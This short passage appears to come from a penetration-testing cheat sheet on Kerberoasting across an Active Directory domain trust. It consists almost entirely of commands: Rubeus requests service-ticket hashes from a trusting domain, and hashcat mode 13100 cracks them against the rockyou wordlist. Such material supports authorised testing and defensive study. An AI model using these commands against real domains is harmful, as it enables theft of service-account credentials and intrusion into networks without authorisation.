From the trusted domain you can launch the attack vs trusting domain:

```bash

.\Rubeus.exe kerberoast /domain:target.external /nowrap

```

Copy paste the hashes into `hash.txt` file. Then just crack the hash like in classic Kerberoasting:

```bash

hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

```